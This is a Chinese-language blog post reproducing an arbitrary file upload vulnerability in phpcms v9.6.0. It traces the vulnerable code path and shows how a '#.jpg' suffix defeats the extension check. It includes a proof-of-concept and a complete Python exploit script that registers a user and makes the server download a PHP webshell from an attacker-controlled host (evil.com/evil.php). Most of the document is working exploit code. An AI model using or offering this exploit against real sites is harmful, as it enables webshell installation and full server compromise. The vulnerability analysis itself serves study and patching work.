categories:
- cve复现
tags:
- cve复现
title: phpcms960任意文件上传复现
---
# phpcmsv9.6.0任意文件上传



## 利用条件

phpcms v9.6.0

开启用户注册功能

## 漏洞复现

根据网络上提供的poc进行漏洞复现:

```python
import re
import requests


def poc(url):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'test',
        'password': 'testxx',
        'email': 'test@test.com',
        'info[content]': '<img src=http://url/shell.txt?.php#.jpg>',
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)

    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    if len(re_result):
        shell = re_result[0]
        print shell

```

漏洞的关键位置

` phpcms/modules/member/index.php `:135

```php
if($member_setting['choosemodel']) {
    require_once CACHE_MODEL_PATH.'member_input.class.php';
    require_once CACHE_MODEL_PATH.'member_update.class.php';
    $member_input = new member_input($userinfo['modelid']);		
    $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
    $user_model_info = $member_input->get($_POST['info']);				        				
}
```

`$_POST['info']`被`new_html_special_chars`处理后,直接作为参数传入`$member_input->get`

跟进去发现

```php
if(is_array($data)) {
			foreach($data as $field=>$value) {
				...
				$field = safe_replace($field);
				...
				$func = $this->fields[$field]['formtype'];
				if(method_exists($this, $func)) $value = $this->$func($field, $value);
	
				$info[$field] = $value;
			}
		}
```

`$this->$func($field, $value);`令人浮想联翩的命令,而`$func = $this->fields[$field]['formtype'];`,其中`$field`是我们可控的输入`new_html_special_chars($_POST['info']) as $field=>$value`

而`$this->fields[$field]['formtype'];`有以下取值,我们可以控制其执行某一函数

```php
$this->fields['catid']['formtype']="catid"
$this->fields['typeid']['formtype']="typeid"
$this->fields['title']['formtype']="title"
$this->fields['keywords']['formtype']="keyword"
$this->fields['copyfrom']['formtype']="copyfrom"
$this->fields['description']['formtype']="textarea"
$this->fields['updatetime']['formtype']="datetime"
$this->fields['content']['formtype']="editor"
$this->fields['thumb']['formtype']="image"
$this->fields['relation']['formtype']="omnipotent"
$this->fields['pages']['formtype']="pages"
$this->fields['inputtime']['formtype']="datetime"
$this->fields['posids']['formtype']="posid"
$this->fields['groupids_view']['formtype']="groupid"
$this->fields['voteid']['formtype']="omnipotent"
$this->fields['islink']['formtype']="islink"
$this->fields['url']['formtype']="text"
$this->fields['listorder']['formtype']="number"
$this->fields['template']['formtype']="template"
$this->fields['allow_comment']['formtype']="box"
$this->fields['status']['formtype']="box"
$this->fields['readpoint']['formtype']="readpoint"
$this->fields['username']['formtype']="text"
```

一个一个查看最后发现:

```php
	function editor($field, $value) {
		$setting = string2array($this->fields[$field]['setting']);
		$enablesaveimage = $setting['enablesaveimage'];
		$site_setting = string2array($this->site_config['setting']);
		$watermark_enable = intval($site_setting['watermark_enable']);
		$value = $this->attachment->download('content', $value,$watermark_enable);
		return $value;
	}
```

`editor`会调用download方法,其中`$field`和`$value`都是可控的

跟进`download`:

```php
function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '')
	{
		global $image_d;
		$this->att_db = pc_base::load_model('attachment_model');
		$upload_url = pc_base::load_config('system','upload_url');
		$this->field = $field;
		$dir = date('Y/md/');
		$uploadpath = $upload_url.$dir;
		$uploaddir = $this->upload_root.$dir;
		$string = new_stripslashes($value);
		if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
		$remotefileurls = array();
		foreach($matches[3] as $matche)
		{
			if(strpos($matche, '://') === false) continue;
			dir_create($uploaddir);
			$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
		}
		unset($matches, $string);
		$remotefileurls = array_unique($remotefileurls);
		$oldpath = $newpath = array();
		foreach($remotefileurls as $k=>$file) {
			if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;
			$filename = fileext($file);
			$file_name = basename($file);
			$filename = $this->getname($filename);

			$newfile = $uploaddir.$filename;
			$upload_func = $this->upload_func;
			if($upload_func($file, $newfile)) {
				$oldpath[] = $k;
				$GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename;
				@chmod($newfile, 0777);
				$fileext = fileext($filename);
				if($watermark){
					watermark($newfile, $newfile,$this->siteid);
				}
				$filepath = $dir.$filename;
				$downloadedfile = array('filename'=>$filename, 'filepath'=>$filepath, 'filesize'=>filesize($newfile), 'fileext'=>$fileext);
				$aid = $this->add($downloadedfile);
				$this->downloadedfiles[$aid] = $filepath;
			}
		}
		return str_replace($oldpath, $newpath, $value);
	}	
```

`download`用`$upload_func($file, $newfile)`来下载文件到服务器,而`$upload_func="copy"`

我们分析一下`download`函数,`$file`和`$newfile`经过的处理

`$file`是`$remotefileurls`中的值

```php
		$string = new_stripslashes($value);//反转义
		if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
		$remotefileurls = array();
		foreach($matches[3] as $matche)
		{
			if(strpos($matche, '://') === false) continue;
			dir_create($uploaddir);
			$remotefileurls[$matche] = $this->fillurl($matche, '', '');
		}
```

跟进`$this->fillurl`,大概功能是,去掉url`#`后面的东西

```php
function fillurl($surl, $absurl, $basehref = '') {
		...
		$pos = strpos($surl,'#');
		if($pos>0) $surl = substr($surl,0,$pos);
		...
	}
```



构造`$value='src=http://evil.com/evil.php#.jpg'`



我们再看下`$newfile`

```php
$dir = date('Y/md/');
$uploaddir = $this->upload_root.$dir;
$filename = fileext($file);
$filename = $this->getname($filename);
$newfile = $uploaddir.$filename;
```

`$this->getname`:

```php
function getname($fileext){
		return date('Ymdhis').rand(100, 999).'.'.$fileext;
	}
```



webshell的地址为:` http://website/uploadfile/date('Y/md/')/date('Ymdhis').rand(100, 999).php`

最后payload为:

```
/index.php?m=member&c=index&a=register&siteid=1
post:
info[content]=<img src="http://evil.com/evil.php">
```



## 利用脚本



```python
import re
import requests
import random

def exp(url,evilurl="http://xxxxxxx/evil.php"):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'test%d'%random.randint(1,999999),
        'password': 'testxx',
        'email': 'test%d@test.com'%random.randint(1,999999),
        'info[content]': 'src=%s#.jpg'%evilurl,
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)
    result=re.search(r"VALUES \('src=(.*)','\d*'\)",rep.text).groups()
    print(rep.text)
    print(result)


exp("http://127.0.0.1/cms/phpcms/9.6.0")
```

